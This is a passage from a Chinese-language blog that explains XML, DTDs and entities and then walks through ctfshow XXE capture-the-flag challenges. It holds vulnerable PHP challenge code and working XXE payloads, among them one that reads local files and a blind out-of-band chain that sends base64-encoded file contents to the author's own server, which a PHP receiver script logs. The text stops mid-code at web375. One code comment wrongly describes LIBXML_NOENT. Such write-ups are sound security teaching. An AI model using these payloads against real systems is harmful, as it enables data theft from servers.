Web 服务和 API 使用 XML 作为数据格式来传输数据。</p></li><li><p><strong>配置文件</strong>：XML 被广泛用于配置文件中，例如在 Web 应用程序、桌面应用程序和服务器软件中。XML 的结构化特性和可读性使其非常适合用于表示配置信息。</p></li><li><p><strong>文档存储</strong>：对于一些具有层次结构的数据，如文档、报告或配置文件，XML 可以提供一种简单的、易于理解的存储格式。某些情况下，将这些数据存储为 XML 文件可能比使用数据库更合适。</p></li><li><p><strong>面向文本的数据</strong>：如果数据的主要形式是文本，而不是结构化数据，那么将其存储为 XML 文件可能更加合适。XML 具有自我描述性，因此即使在没有其他说明的情况下，也可以轻松地理解数据的结构和内容。</p></li><li><p><strong>支持分散的数据存储</strong>：在一些分散式系统中，每个组件都可能需要维护自己的数据存储。在这种情况下，XML 可以作为一种轻量级的、独立的数据存储格式，允许每个组件在不依赖中央数据库的情况下管理自己的数据</p><p>）</p></li></ol><h3 id="DTD（文档类型定义）"><a href="#DTD（文档类型定义）" class="headerlink" title="DTD（文档类型定义）"></a>DTD（文档类型定义）</h3><p>dtd通常在xml文档中在 XML 中，可以使用 DTD 来定义以下内容：</p><ol><li><strong>元素的结构和关系</strong>：DTD 可以定义 XML 文档中的元素以及它们之间的层次结构和关系。这包括定义元素的名称、元素可以包含的子元素、子元素的顺序和数量等信息。</li><li><strong>元素的属性</strong>：DTD 可以定义元素可以具有的属性，包括属性的名称、数据类型、取值范围等信息。</li><li><strong>实体</strong>：DTD 还可以声明实体，用于在 XML 文档中定义可重复使用的文本片段或字符。这样可以使 XML 文档更具可读性和可维护性。</li><li><strong>CDATA 部分</strong>：DTD 可以定义 CDATA（Character Data，字符数据）部分，用于包含文本数据而不进行 XML 解析。CDATA 部分通常用于包含特殊字符或者大段文本数据。</li></ol><p>通过使用 DTD，可以为 XML 文档定义结构和约束，以确保文档的有效性和一致性。DTD 可以内联在 XML 文档中，也可以作为单独的文件引用</p><p>例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">bookstore</span> [</span><br><span class="hljs-meta">    &lt;!-- 定义书籍元素 括号中是book元素的子元素 --&gt;</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">book</span> (<span class="hljs-keyword">title</span>, <span class="hljs-keyword">author</span>, <span class="hljs-keyword">year</span>, <span class="hljs-keyword">price</span>)&gt;</span></span><br><span class="hljs-meta">    </span><br><span class="hljs-meta">    &lt;!-- 定义标题元素 其中#PCDATA表示这些元素可以包含文本数据 --&gt;</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">title</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta">    </span><br><span class="hljs-meta">    &lt;!-- 定义作者元素 --&gt;</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">author</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta">    </span><br><span class="hljs-meta">    &lt;!-- 定义出版年份元素 --&gt;</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">year</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta">    </span><br><span class="hljs-meta">    &lt;!-- 定义价格元素 --&gt;</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">price</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta">    </span><br><span class="hljs-meta">    &lt;!-- 定义书店元素 --&gt;</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">bookstore</span> (<span class="hljs-keyword">book</span>+)&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure><h3 id="DTD声明"><a href="#DTD声明" class="headerlink" title="DTD声明"></a>DTD声明</h3><p>dtd声明可以分为外部声明和内部声明</p><p>外部声明：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;flag.php&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>其中的SYSTEM可以理解成他会把在它后边的内容理解成一个合法的系统标识，从而找到文件的位置</p><p>内部声明：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">bookstore</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">bookstore</span> (<span class="hljs-keyword">book</span>*)&gt;</span> </span><br><span class="hljs-meta">&lt;!-- 其中的*表示一个或多个book元素 --&gt;</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">book</span> <span class="hljs-keyword">EMPTY</span>&gt;</span></span><br><span class="hljs-meta">&lt;!-- 其中的EMPTY表示book是一个空元素 --&gt;</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ATTLIST <span class="hljs-keyword">book</span></span></span><br><span class="hljs-meta"><span class="hljs-meta">        <span class="hljs-keyword">id</span> <span class="hljs-keyword">ID</span> <span class="hljs-keyword">#REQUIRED</span></span></span><br><span class="hljs-meta"><span class="hljs-meta">        <span class="hljs-keyword">title</span> <span class="hljs-keyword">CDATA</span> <span class="hljs-keyword">#IMPLIED</span></span></span><br><span class="hljs-meta"><span class="hljs-meta">    &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure><h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>内部实体：<!ENTITY 实体名称 "实体值"></p><p>例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">article</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">title</span> <span class="hljs-string">&quot;Introduction to XML&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">author</span> <span class="hljs-string">&quot;John Doe&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">date</span> <span class="hljs-string">&quot;2024-03-26&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">article</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-symbol">&amp;title;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><span class="hljs-symbol">&amp;author;</span><span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">date</span>&gt;</span><span class="hljs-symbol">&amp;date;</span><span class="hljs-tag">&lt;/<span class="hljs-name">date</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">content</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- 文章内容 --&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">content</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">article</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>外部实体：<!ENTITY 实体名称 SYSTEM "外部文件URI"></p><p>假设我们有一个包含很多实体的外部 XML 文件 entities.xml，它定义了一些常用的术语如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">entities</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">term1</span> <span class="hljs-string">&quot;XML&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">term2</span> <span class="hljs-string">&quot;HTML&quot;</span>&gt;</span></span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">term3</span> <span class="hljs-string">&quot;CSS&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure><p>现在我们可以在另一个 XML 文档中引用这个外部实体文件，并且重复使用其中定义的术语如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">article</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;entities.xml&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">article</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Introduction to &amp;term1;<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">content</span>&gt;</span><br>        &amp;term1; is a markup language used for structuring and presenting content on the web.<br>        &amp;term2; is another markup language commonly used in web development.<br>        &amp;term3; is a style sheet language used for describing the presentation of a document written in a markup language.<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">content</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">article</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="ctfshow例题"><a href="#ctfshow例题" class="headerlink" title="ctfshow例题"></a>ctfshow例题</h2><h3 id="web-373"><a href="#web-373" class="headerlink" title="web 373"></a>web 373</h3><p>源码解析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2021-01-07 12:59:52</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//以上是注释不用管</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">//禁用错误报告</span><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<span class="hljs-comment">//可以使用实体加载器；如果将false改为ture那么将禁用实体加载器</span><br><br><span class="hljs-comment">//以下这个点将会成为我们注入的关键</span><br><br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<span class="hljs-comment">//从输入流中获取</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<span class="hljs-comment">//创建了一个DOMDocument对象</span><br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<span class="hljs-comment">//这行代码加载 XML 数据到 DOMDocument 对象中。LIBXML_NOENT 和 LIBXML_DTDLOAD 是解析选项，用于控制解析器的行为。其中，LIBXML_NOENT 用于防止实体替换，LIBXML_DTDLOAD 用于允许加载 DTD</span><br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<span class="hljs-comment">//这行代码将 DOMDocument 对象转换为 SimpleXMLElement 对象 这样可以更简单的对数据进行处理</span><br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$creds</span>-&gt;ctfshow;<span class="hljs-comment">//寻找数据中的ctfshow元素或者实体</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ctfshow</span>;<span class="hljs-comment">//将其输出</span><br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-comment">//高亮显示这个文档的代码    </span><br><br></code></pre></td></tr></table></figure><p>有以上的代码可以知道我们需要在传入的数据中有实体并且这个实体存在于元素ctfshow中开始构造：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxe</span>[</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">hack</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">H3rme</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ctfshow</span>&gt;</span><br>        <span class="hljs-symbol">&amp;hack;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ctfshow</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">H3rmes</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p><strong>对于DOCTYPE和ENTITY的拼写一定要注意不要拼写错误了还有file:&#x2F;&#x2F;后表示访问本地文件的路径&#x2F;表示根目录  我试过.&#x2F;不行表示当前文件夹</strong></p><p><strong>还有一点元素ctfshow一定要直接放到根元素下这样才能被直接访问到            我试过加一个元素嵌套或者直接把ctfshow作为根元素但是不行这样会导致它不能直接的正确地解析到直接在根元素下的元素</strong></p><p>这些问题都会直接导致无法正确的输出flag</p><p>操作如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-27%20214354.png" alt="屏幕截图 2024-03-27 214354"></p><p>以上是改包直接在bp中看response</p><p>也可以直接改包发包然后在浏览器中看flag 如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-27%20214449.png" alt="屏幕截图 2024-03-27 214449"></p><h4 id="实体替换："><a href="#实体替换：" class="headerlink" title="实体替换："></a>实体替换：</h4><p>举个例子：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">example</span>[</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">hello</span> <span class="hljs-string">&quot;Hello, World!&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">greeting</span>&gt;</span><span class="hljs-symbol">&amp;hello;</span><span class="hljs-tag">&lt;/<span class="hljs-name">greeting</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>以上代码中的&amp;hello会被替换成Hello，world这便是实体替换</p><p>但是以下代码中的实体是指路径不是具体的值所以并不能算实体替换</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxe</span>[</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">hack</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">H3rmesk1t</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ctfshow</span>&gt;</span><br>        <span class="hljs-symbol">&amp;hack;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ctfshow</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">H3rmesk1t</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="web374"><a href="#web374" class="headerlink" title="web374"></a>web374</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2021-01-07 12:59:52</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);  <br></code></pre></td></tr></table></figure><p>经过和第一关的对比发现这关比上一关少一些代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br>   <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$creds</span>-&gt;ctfshow;<br>   <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ctfshow</span>;<br></code></pre></td></tr></table></figure><p>也就是说这关无法将我们想要的flag输出因此我们不能再试图从页面中得到flag可以试试去将其中的flag输出到其他地方 比如：通过一个网址将其输入到对应的服务器上</p><p>（前提要有一个公网ip也就是需要一个服务器操作系统要centos [推荐学生可以去免费领几个月：<a href="https://developer.aliyun.com/plan/student]">https://developer.aliyun.com/plan/student]</a> 然后下载宝塔这样便于我们对根目录的文件进行操作 相关教程可以去网上搜 ）注意：在操作的时候要注意的几个点：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240329151425106.png" alt="image-20240329151425106"></p><p>新建的时候这样操作可以直接通过这个ip来访问而且也可以对其的根目录文件操作，同时不需要再去购买域名</p><p>还有一点：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-29%20130659.png" alt="屏幕截图 2024-03-29 130659"></p><p>如果重启web服务器而且各种办法都没有办法解决的话可以去试试换个浏览器   （亲测有奇效）</p><p>然后开始做题：</p><p>首先在我们在宝塔中所创建的网站的根目录下创建两个文件</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240329152235339.png" alt="image-20240329152235339"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240329152312752.png" alt="image-20240329152312752"></p><p>xxe.xml:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; xxe  SYSTEM &#x27;http://填自己创建的网站的ip/1.php?file=%file;&#x27;&gt; &quot;</span>&gt;</span><br>%dtd;<br>%xxe;<br></code></pre></td></tr></table></figure><p>这行代码使用了两个实体参数<code>&amp;#x25;</code>就是一个html实体编码和%一样 它的作用是当xml解析器解析是会去访问<code>http://填自己创建的网站的ip/1.php?file=%file</code>从而会通过get传参将参数%file中的内容输入到这个网站对应的目录中</p><p>1.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) ; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>和以上代码搭配使用将file的内容传入到文件test.txt中</p><p>然后payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">aaa</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://填自己创建的网站的ip/xxe.xml&quot;</span>&gt;</span></span><br><span class="hljs-meta">%aaa;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br><span class="hljs-comment">&lt;!--以上代码同样也主要是实体参数 可以看出参数%file的内容是经过base64编码后的flag（php://filter 是封装器，用于对数据进行过滤和处理）然后先声明%aaa 然后通过%aaa进行访问到xml文件从而将参数%file成功传入再通过后端php最后会出现一个新文件test.txt里面的内容便是经过base64编码后的flag </span><br><span class="hljs-comment">在这里因为flag中存在特殊字符在传输的时候可能会导致出现错误所以进行了base64编码--&gt;</span><br></code></pre></td></tr></table></figure><p>如图:</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240329161102352.png" alt="image-20240329161102352"></p><p>然后刷新宝塔发现新出现了一个test.txt </p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240329161226302.png" alt="image-20240329161226302"></p><p>然后将里面的内容进行base64解码 在线解码工具：<a href="https://www.base64decode.org/zh/">https://www.base64decode.org/zh/</a></p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-29%20161404.png" alt="屏幕截图 2024-03-29 161404"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-29%20161434.png" alt="屏幕截图 2024-03-29 161434"></p><p>完成！</p><h3 id="web375"><a href="#web375" class="headerlink" title="web375"></a>web375</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2021-01-07 12:59:52</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2021-01-07 15:22:05</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span 